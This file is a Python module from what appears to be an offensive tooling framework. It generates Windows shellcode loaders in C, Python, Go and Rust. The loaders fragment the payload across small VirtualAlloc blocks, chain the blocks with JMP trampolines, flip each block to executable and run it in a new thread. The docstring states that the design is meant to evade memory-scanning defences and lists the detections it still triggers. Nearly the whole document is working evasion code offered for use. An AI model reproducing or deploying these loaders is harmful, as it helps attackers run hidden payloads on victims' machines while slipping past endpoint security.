"""Loader: win_split_alloc — fragmented VirtualAlloc blocks linked by JMP trampolines.

Tier 3 (allocation pattern obfuscation).

Strategy:
  Divide the shellcode into CHUNK_SIZE-byte slices. Allocate each slice in a
  separate VirtualAlloc call (RW), then patch a 13-byte JMP trampoline at the
  end of each chunk pointing to the next chunk's base address. Flip all chunks
  to RX in a second pass, then execute from the first chunk's base.

JMP trampoline encoding (x64, 13 bytes):
  49 BB [8-byte addr]   mov r11, imm64
  41 FF E3              jmp r11

  r11 is used rather than rax to avoid clobbering the ordinal index that the
  win_x64 shellcode carries in rax across the chunk 1→2 boundary.

Evasion properties:
  - No single contiguous RWX or RX allocation covering the full shellcode
  - Each individual VirtualAlloc is CHUNK_SIZE + 13 bytes (small, unassuming)
  - Executable chunks are scattered across the address space; pattern-scan
    heuristics that look for large executable private regions are defeated
  - RW → RX two-stage keeps no chunk ever simultaneously writable + executable

Still triggers on:
  - Multiple small VirtualProtect(RX) calls on anonymous memory in rapid succession
  - CreateThread from a non-image-backed page

chunk_size constraint — relative-branch safety:
  Any relative branch (jne, jmp, call, etc.) whose source and target land in
  different chunk allocations will jump to the wrong address because the baked
  displacement was computed for the original contiguous layout.

  Safe: branches whose source AND target fall within the same chunk. Whether a
  branch is actually executed matters — cross-chunk error-path branches that are
  never taken are harmless.

  For win_x64 shellcode the search loop (jne search, ~48 byte span), jmp get_str
  (forward 25 bytes), and call cmd_exec (backward 23 bytes) must all fit inside a
  single chunk. chunk_size=64 (the default) satisfies this; chunk_size ≤ 48 will
  break because the loop body spans multiple chunks.

  Rule of thumb: chunk_size ≥ (max backward-branch span in the shellcode).
  _pad_chunks() warns via stderr if capstone detects cross-chunk taken-direction
  backward branches.

Parameters:
  chunk_size (int): bytes of shellcode per allocation [default: 64]
    Tune larger for more fragmentation tolerance; must be ≥ max backward-branch
    span in the payload. Increasing this value also reduces the number of
    allocation calls and scattered regions.
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_split_alloc")

_DEFAULT_CHUNK = 64


def _chunk_ranges(shellcode: bytes, chunk_size: int) -> list[tuple[int, int]]:
    """Return (start, end_inclusive) byte ranges for each instruction-aligned chunk."""
    try:
        import capstone
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        ranges: list[tuple[int, int]] = []
        chunk_start = chunk_used = 0
        for instr in md.disasm(shellcode, 0):
            size = len(instr.bytes)
            if chunk_used > 0 and chunk_used + size > chunk_size:
                ranges.append((chunk_start, chunk_start + chunk_used - 1))
                chunk_start += chunk_used
                chunk_used = 0
            chunk_used += size
        if chunk_start < len(shellcode):
            ranges.append((chunk_start, len(shellcode) - 1))
        return ranges
    except ImportError:
        return [(i, min(i + chunk_size - 1, len(shellcode) - 1))
                for i in range(0, len(shellcode), chunk_size)]


def _warn_cross_chunk_branches(shellcode: bytes, chunk_size: int) -> None:
    """Emit a warning to stderr when backward branches cross chunk boundaries.

    A backward branch (loop) with source in chunk N and target in chunk M < N
    will jump to a wrong address in the split-allocation layout and crash.
    Forward cross-chunk branches are equally broken but harder to detect without
    control-flow analysis; they are not warned on here.
    """
    import sys
    try:
        import capstone
    except ImportError:
        return
    ranges = _chunk_ranges(shellcode, chunk_size)
    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    BRANCH_MNEMONICS = frozenset(
        "ja jae jb jbe jc je jg jge jl jle jna jnae jnb jnbe jnc jne jng jnge "
        "jnl jnle jno jnp jns jnz jo jp jpe jpo js jz jmp call".split()
    )
    for instr in md.disasm(shellcode, 0):
        if instr.mnemonic not in BRANCH_MNEMONICS:
            continue
        # Extract immediate target if encoded as rel8/rel32
        op_str = instr.op_str.strip()
        if not op_str.startswith("0x"):
            continue
        try:
            target = int(op_str, 16)
        except ValueError:
            continue
        src_off = instr.address
        if target >= src_off:   # forward branches: skip (harder to reason about)
            continue
        # Backward branch — check whether source and target are in the same chunk
        def chunk_idx(off: int) -> int:
            for i, (lo, hi) in enumerate(ranges):
                if lo <= off <= hi:
                    return i
            return -1
        src_chunk = chunk_idx(src_off)
        tgt_chunk = chunk_idx(target)
        if src_chunk != tgt_chunk and src_chunk != -1 and tgt_chunk != -1:
            import sys
            print(
                f"[win_split_alloc] WARNING: backward branch at offset {src_off} "
                f"(chunk {src_chunk}) targets offset {target} (chunk {tgt_chunk}) — "
                f"cross-chunk! Execution will crash. Increase chunk_size (currently {chunk_size}).",
                file=sys.stderr,
            )


def _pad_chunks(shellcode: bytes, chunk_size: int) -> bytes:
    """Split shellcode at x64 instruction boundaries, NOP-pad each chunk to chunk_size.

    Prevents JMP trampolines from being placed mid-instruction when a raw
    byte-stride split would land inside a multi-byte opcode. Requires capstone;
    falls back to naive stride split if capstone is unavailable.

    Also calls _warn_cross_chunk_branches() to flag chunk_size values that are
    too small for the shellcode's control flow.
    """
    _warn_cross_chunk_branches(shellcode, chunk_size)
    try:
        import capstone
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        chunks: list[bytes] = []
        chunk_start = 0
        chunk_used = 0
        for instr in md.disasm(shellcode, 0):
            size = len(instr.bytes)
            if chunk_used > 0 and chunk_used + size > chunk_size:
                chunks.append(shellcode[chunk_start : chunk_start + chunk_used])
                chunk_start += chunk_used
                chunk_used = 0
            chunk_used += size
        if chunk_start < len(shellcode):
            chunks.append(shellcode[chunk_start:])
    except ImportError:
        chunks = [shellcode[i : i + chunk_size] for i in range(0, len(shellcode), chunk_size)]

    padded = b""
    for c in chunks:
        padded += c + b"\x90" * max(0, chunk_size - len(c))
    return padded


_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_array}

#define CHUNK_SIZE   {chunk_size}
#define TRAMP_SIZE   13   /* mov r11, imm64 (10B) + jmp r11 (3B) */

int main(void) {{
    int n = (sc_len + CHUNK_SIZE - 1) / CHUNK_SIZE;
    LPVOID *mem = (LPVOID *)calloc(n, sizeof(LPVOID));
    if (!mem) return 1;

    /* Allocate each chunk as RW and copy payload slice */
    for (int i = 0; i < n; i++) {{
        mem[i] = VirtualAlloc(NULL, CHUNK_SIZE + TRAMP_SIZE,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!mem[i]) {{
            fprintf(stderr, "[-] VirtualAlloc chunk %d failed: %lu\\n", i, GetLastError());
            return 1;
        }}
        int off = i * CHUNK_SIZE;
        int len = sc_len - off;
        if (len > CHUNK_SIZE) len = CHUNK_SIZE;
        memcpy(mem[i], sc + off, len);
    }}

    /* Patch inter-chunk JMP trampolines (all but the last chunk) */
    for (int i = 0; i < n - 1; i++) {{
        BYTE *t    = (BYTE *)mem[i] + CHUNK_SIZE;
        UINT64 nxt = (UINT64)(ULONG_PTR)mem[i + 1];
        t[0] = 0x49; t[1] = 0xBB;      /* mov r11, imm64 */
        memcpy(t + 2, &nxt, 8);
        t[10] = 0x41; t[11] = 0xFF; t[12] = 0xE3;  /* jmp r11 */
    }}

    /* Flip all chunks to RX */
    for (int i = 0; i < n; i++) {{
        DWORD old;
        if (!VirtualProtect(mem[i], CHUNK_SIZE + TRAMP_SIZE,
                            PAGE_EXECUTE_READ, &old)) {{
            fprintf(stderr, "[-] VirtualProtect chunk %d failed: %lu\\n", i, GetLastError());
            return 1;
        }}
    }}

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem[0],
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    for (int i = 0; i < n; i++) VirtualFree(mem[i], 0, MEM_RELEASE);
    free(mem);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import struct
import sys

{sc_bytes}

CHUNK_SIZE = {chunk_size}
TRAMP_SIZE = 13   # mov r11, imm64 (10B) + jmp r11 (3B)

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.CreateThread.restype = ctypes.c_void_p

n = (len(sc) + CHUNK_SIZE - 1) // CHUNK_SIZE
chunks = []

# Allocate each chunk as RW and copy payload slice
for i in range(n):
    mem = kernel32.VirtualAlloc(None, CHUNK_SIZE + TRAMP_SIZE,
                                0x3000,   # MEM_COMMIT | MEM_RESERVE
                                0x04)     # PAGE_READWRITE
    if not mem:
        sys.exit(1)
    off = i * CHUNK_SIZE
    data = sc[off : off + CHUNK_SIZE]
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(data))
    chunks.append(mem)

# Patch inter-chunk JMP trampolines
for i in range(n - 1):
    tramp_addr = chunks[i] + CHUNK_SIZE
    nxt = chunks[i + 1]
    # 49 BB [8-byte LE addr] 41 FF E3
    stub = b'\\x49\\xbb' + struct.pack('<Q', nxt) + b'\\x41\\xff\\xe3'
    buf  = (ctypes.c_char * TRAMP_SIZE).from_buffer_copy(stub)
    kernel32.RtlMoveMemory(ctypes.c_void_p(tramp_addr), buf, TRAMP_SIZE)

# Flip all chunks to RX
old = ctypes.c_ulong(0)
for addr in chunks:
    if not kernel32.VirtualProtect(ctypes.c_void_p(addr), CHUNK_SIZE + TRAMP_SIZE,
                                   0x20,   # PAGE_EXECUTE_READ
                                   ctypes.byref(old)):
        sys.exit(1)

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(chunks[0]), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


_GO_TEMPLATE = """\
package main

import (
\t"encoding/binary"
\t"syscall"
\t"unsafe"
)

{sc_bytes}

const chunkSize = {chunk_size}
const trampSize = 13

func main() {{
\tk32             := syscall.NewLazyDLL("kernel32.dll")
\tpVirtualAlloc   := k32.NewProc("VirtualAlloc")
\tpVirtualFree    := k32.NewProc("VirtualFree")
\tpVirtualProtect := k32.NewProc("VirtualProtect")
\tpCreateThread   := k32.NewProc("CreateThread")
\tpWaitSingle     := k32.NewProc("WaitForSingleObject")
\tpRtlMove        := k32.NewProc("RtlMoveMemory")

\tn := (len(sc) + chunkSize - 1) / chunkSize
\tchunks := make([]uintptr, n)

\tfor i := 0; i < n; i++ {{
\t\taddr, _, _ := pVirtualAlloc.Call(0, chunkSize+trampSize, 0x3000, 0x04)
\t\tif addr == 0 {{
\t\t\treturn
\t\t}}
\t\toff := i * chunkSize
\t\tend := off + chunkSize
\t\tif end > len(sc) {{
\t\t\tend = len(sc)
\t\t}}
\t\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[off])), uintptr(end-off))
\t\tchunks[i] = addr
\t}}

\tvar tramp [trampSize]byte
\tfor i := 0; i < n-1; i++ {{
\t\ttrampAddr := chunks[i] + chunkSize
\t\ttramp[0], tramp[1] = 0x49, 0xBB
\t\tbinary.LittleEndian.PutUint64(tramp[2:], uint64(chunks[i+1]))
\t\ttramp[10], tramp[11], tramp[12] = 0x41, 0xFF, 0xE3
\t\tpRtlMove.Call(trampAddr, uintptr(unsafe.Pointer(&tramp[0])), trampSize)
\t}}

\tvar old uint32
\tfor _, addr := range chunks {{
\t\tpVirtualProtect.Call(addr, chunkSize+trampSize, 0x20,
\t\t\tuintptr(unsafe.Pointer(&old)))
\t}}

\tht, _, _ := pCreateThread.Call(0, 0, chunks[0], 0, 0, 0)
\tif ht == 0 {{
\t\treturn
\t}}
\tpWaitSingle.Call(ht, 0xFFFFFFFF)
\t_ = pVirtualFree
}}
"""

_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::{{mem, ptr}};

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
                    flProtect: u32) -> *mut u8;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32,
                      lpflOldProtect: *mut u32) -> i32;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize,
                    lpStartAddress: unsafe extern "system" fn(*mut u8) -> u32,
                    lpParameter: *mut u8, dwCreationFlags: u32,
                    lpThreadId: *mut u32) -> *mut u8;
    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
}}

const CHUNK_SIZE: usize = {chunk_size};
const TRAMP_SIZE: usize = 13;

fn main() {{
    {sc_bytes}
    unsafe {{
        let n = (sc.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        let mut chunks: Vec<*mut u8> = Vec::with_capacity(n);

        for i in 0..n {{
            let addr = VirtualAlloc(ptr::null_mut(), CHUNK_SIZE + TRAMP_SIZE, 0x3000, 0x04);
            if addr.is_null() {{ return; }}
            let off = i * CHUNK_SIZE;
            let end = (off + CHUNK_SIZE).min(sc.len());
            ptr::copy_nonoverlapping(sc.as_ptr().add(off), addr, end - off);
            chunks.push(addr);
        }}

        // Patch JMP trampolines: 49 BB [8-byte addr LE] 41 FF E3
        for i in 0..n - 1 {{
            let tramp_addr = chunks[i].add(CHUNK_SIZE);
            let nxt = chunks[i + 1] as u64;
            let mut t = [0u8; TRAMP_SIZE];
            t[0] = 0x49; t[1] = 0xBB;
            t[2..10].copy_from_slice(&nxt.to_le_bytes());
            t[10] = 0x41; t[11] = 0xFF; t[12] = 0xE3;
            ptr::copy_nonoverlapping(t.as_ptr(), tramp_addr, TRAMP_SIZE);
        }}

        let mut old: u32 = 0;
        for &addr in &chunks {{
            VirtualProtect(addr, CHUNK_SIZE + TRAMP_SIZE, 0x20, &mut old);
        }}

        let entry: unsafe extern "system" fn(*mut u8) -> u32 = mem::transmute(chunks[0]);
        let ht = CreateThread(ptr::null_mut(), 0, entry, ptr::null_mut(), 0, ptr::null_mut());
        if ht.is_null() {{ return; }}
        WaitForSingleObject(ht, 0xFFFFFFFF);
    }}
}}
"""


def generate_c(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a C loader that fragments shellcode into separate VirtualAlloc blocks."""
    padded = _pad_chunks(shellcode, chunk_size)
    return _C_TEMPLATE.format(
        sc_array=_render.c_array_literal(padded, "sc"),
        chunk_size=chunk_size,
    )


def generate_python(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a Python ctypes loader using fragmented allocations + JMP trampolines."""
    padded = _pad_chunks(shellcode, chunk_size)
    return _PY_TEMPLATE.format(
        sc_bytes=_render.python_bytes_literal(padded, "sc"),
        chunk_size=chunk_size,
    )


def generate_go(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a Go loader using fragmented VirtualAlloc blocks + JMP trampolines."""
    padded = _pad_chunks(shellcode, chunk_size)
    return _GO_TEMPLATE.format(
        sc_bytes=_render.go_bytes_literal(padded, "sc"),
        chunk_size=chunk_size,
    )


def generate_rust(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a Rust loader using fragmented VirtualAlloc blocks + JMP trampolines."""
    padded = _pad_chunks(shellcode, chunk_size)
    return _RS_TEMPLATE.format(
        sc_bytes=_render.rust_bytes_literal(padded, "sc"),
        chunk_size=chunk_size,
    )
